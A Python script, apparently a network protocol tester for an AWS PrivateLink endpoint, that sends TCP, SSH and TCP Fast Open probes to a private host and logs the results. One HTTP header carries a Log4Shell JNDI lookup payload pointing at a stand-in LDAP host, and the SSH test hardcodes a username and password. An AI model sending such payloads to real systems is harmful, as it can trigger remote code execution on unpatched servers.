import argparse
import socket
import csv
import datetime
import os
import paramiko
import threading
import time

# Logging Function
def log(message, log_dir, start_time):
    timestamp = datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
    if log_dir:
        log_file = os.path.join(log_dir, f"{start_time}-log.txt")
        with open(log_file, 'a') as f:
            f.write(f"[{timestamp}] {message}\n")
    print(f"[{timestamp}] {message}")

# Report Writing Function
def write_report(data, report_dir, start_time):
    if report_dir:
        report_file = os.path.join(report_dir, f"{start_time}-report.csv")
        with open(report_file, 'w', newline='') as csvfile:
            writer = csv.writer(csvfile)
            writer.writerow(["Timestamp", "Protocol", "Source IP", "Source Port", "Destination IP", "Destination Port", "Status"])
            for entry in data:
                writer.writerow(entry)

# TCP 8080 Test with HTTP Header Injection
def tcp_8080_header_injection_test(target_host, target_port, log_enabled, report_data, log_dir, start_time):
    headers = "User-Agent: TestAgent\r\nX-Log4J: \${jndi:ldap://example.com/a}\r\n"
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.bind(('', 0))
        sock.settimeout(5)
        sock.connect((target_host, target_port))
        source_ip, source_port = sock.getsockname()
        message = f"GET / HTTP/1.1\r\nHost: {target_host}\r\n{headers}\r\n"
        sock.sendall(message.encode())
        response = sock.recv(4096)
        result = f"TCP Test Success: Source {source_ip}:{source_port} -> Destination {target_host}:{target_port} - Received response"
        if log_enabled:
            log(result, log_dir, start_time)
        report_data.append([datetime.datetime.now(), "TCP", source_ip, source_port, target_host, target_port, "Success"])
    except Exception as e:
        result = f"TCP Test Failed: {e}"
        if log_enabled:
            log(result, log_dir, start_time)
        report_data.append([datetime.datetime.now(), "TCP", "N/A", "N/A", target_host, target_port, "Failed"])
    finally:
        sock.close()

# TCP SYN with Random Header Data on port 8081
def tcp_syn_random_header_test(target_host, target_port, log_enabled, report_data, log_dir, start_time):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.bind(('', 0))
        sock.settimeout(5)
        sock.connect((target_host, target_port))
        source_ip, source_port = sock.getsockname()
        # Custom data in SYN packet
        message = f"SYN Random Data Test from {source_ip}"
        sock.sendall(message.encode())
        response = sock.recv(4096)
        result = f"TCP SYN with Random Header Test Success: Source {source_ip}:{source_port} -> Destination {target_host}:{target_port} - Received response"
        if log_enabled:
            log(result, log_dir, start_time)
        report_data.append([datetime.datetime.now(), "TCP", source_ip, source_port, target_host, target_port, "Success"])
    except Exception as e:
        result = f"TCP SYN with Random Header Test Failed: {e}"
        if log_enabled:
            log(result, log_dir, start_time)
        report_data.append([datetime.datetime.now(), "TCP", "N/A", "N/A", target_host, target_port, "Failed"])
    finally:
        sock.close()

# SSH on TCP/53 with DNS through SSH Tunnel
def ssh_tcp_53_dns_test(target_host, log_enabled, report_data, log_dir, start_time):
    ssh_client = paramiko.SSHClient()
    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh_client.connect(target_host, port=53, username='testuser', password='testpassword')
        source_ip = "local"
        source_port = "53"
        _, stdout, _ = ssh_client.exec_command('dig @127.0.0.1 example.com')
        result = stdout.read().decode()
        if log_enabled:
            log(f"SSH Tunnel DNS Test: {result}", log_dir, start_time)
        report_data.append([datetime.datetime.now(), "SSH", source_ip, source_port, target_host, 53, "Success"])
    except Exception as e:
        if log_enabled:
            log(f"SSH Tunnel DNS Test Failed: {e}", log_dir, start_time)
        report_data.append([datetime.datetime.now(), "SSH", "local", 53, target_host, 53, "Failed"])
    finally:
        ssh_client.close()

# TCP Fast Open Test
def tcp_fast_open_test(target_host, target_port, log_enabled, report_data, log_dir, start_time):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_FASTOPEN, 1)
        sock.bind(('', 0))
        sock.connect((target_host, target_port))
        source_ip, source_port = sock.getsockname()
        message = "Hello from TCP Fast Open"
        sock.send(message.encode())
        result = f"TCP Fast Open Test: Source {source_ip}:{source_port} -> Destination {target_host}:{target_port}"
        if log_enabled:
            log(result, log_dir, start_time)
        report_data.append([datetime.datetime.now(), "TCP", source_ip, source_port, target_host, target_port, "Success"])
    except Exception as e:
        if log_enabled:
            log(f"TCP Fast Open Test Failed: {e}", log_dir, start_time)
        report_data.append([datetime.datetime.now(), "TCP", "N/A", "N/A", target_host, target_port, "Failed"])
    finally:
        sock.close()

# Main Function
def main():
    parser = argparse.ArgumentParser(description="AWS PrivateLink Protocol Tester")
    parser.add_argument("--log", action='store_true', help="Generate a full log file with $day/hour/minute-log.txt.")
    parser.add_argument("--report", action='store_true', help="Generate a CSV report with $day/hour/minute-report.csv.")
    parser.add_argument("--both", action='store_true', help="Generate both log and report files.")
    args = parser.parse_args()

    if not any(vars(args).values()):
        parser.print_help()
        return

    log_enabled = args.log or args.both
    report_enabled = args.report or args.both
    
    target_host = "10.1.2.69"
    report_data = []
    start_time = datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')

    if log_enabled or report_enabled:
        log_dir = "/home/ec2-user/"
        report_dir = "/home/ec2-user/"
        os.makedirs(log_dir, exist_ok=True)
        os.makedirs(report_dir, exist_ok=True)
    else:
        log_dir = None

    # Run test cases 5 times each
    for _ in range(5):
        tcp_8080_header_injection_test(target_host, 8080, log_enabled, report_data, log_dir, start_time)
        ssh_tcp_53_dns_test(target_host, log_enabled, report_data, log_dir, start_time)
        tcp_syn_random_header_test(target_host, 8081, log_enabled, report_data, log_dir, start_time)
        tcp_fast_open_test(target_host, 8082, log_enabled, report_data, log_dir, start_time)

    if report_enabled:
        write_report(report_data, report_dir, start_time)

if __name__ == "__main__":
    main()
